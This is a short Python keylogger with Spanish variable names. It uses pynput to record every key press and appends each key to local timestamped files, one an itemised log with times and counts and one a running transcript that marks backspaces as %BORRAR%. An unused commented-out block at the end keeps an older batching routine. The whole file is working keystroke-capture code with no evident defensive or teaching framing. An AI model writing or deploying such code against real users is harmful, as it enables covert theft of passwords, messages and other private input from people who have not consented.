import datetime
from pynput.keyboard import Listener
from io import open


def obtenerfh():
    return datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

Fecha_hoy=obtenerfh()

milista = []


cont_letras=0
cont_lote=0

def imprimir_linea(archivo,key,fecha,n):
    n=str(n)
    if key == "Key.space":
        key=" "
    elif key == "Key.alt_l":
        key="ALT"

    archivo.write("Caracter "+key+" fecha y hora "+fecha+" ----->total "+n+"\n")

def escribir(letra,archivo):
    if letra == "Key.enter":
        archivo.write("\n")
    elif letra == "Key.space":
        archivo.write(" ")
    elif letra == "Key.alt_l":
        archivo.write("ALT")
    elif letra == "Key.backspace":
        archivo.write("%BORRAR%")
    else:
        archivo.write(letra.replace("'", ""))


def Recibirtecla(key):
    global cont_letras
    fichero = open(f"informacion_{Fecha_hoy}.txt", "a")
    fichero2=open(f"informacion_total_{Fecha_hoy}.txt", "a")
    fecha_hora=obtenerfh()
    key = str(key)
    cont_letras+=1
    imprimir_linea(fichero,key,fecha_hora,cont_letras)
    escribir(key,fichero2)

    milista.append(key)

with Listener(on_press=Recibirtecla) as l:
    l.join()


"""
    for i in milista:
        if cont_letra == 20:
            fichero.close()
            # fichero = open(f"informacion_{Fecha_hoy}.txt", "w")
            fecha = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            fichero = open(f"informacion_{fecha}.txt", "w")
            cont_letra = 0

        if i == "Key.enter":
            fichero.write("\n")
            cont_enter = cont_enter + 1
        elif i == "Key.space":
            fichero.write(" ")
            cont_space = cont_space + 1
        elif i == "Key.alt_l":
            fichero.write("ALT")
            cont_alt = cont_alt + 1
        elif i == "Key.backspace":
            fichero.write("%BORRAR%")
            cont_back = cont_back + 1
        else:
            fichero.write(i.replace("'", ""))
            cont_letra = cont_letra + 1

        # fichero.write("\nCantidad de letras %d"%cont_letra)

"""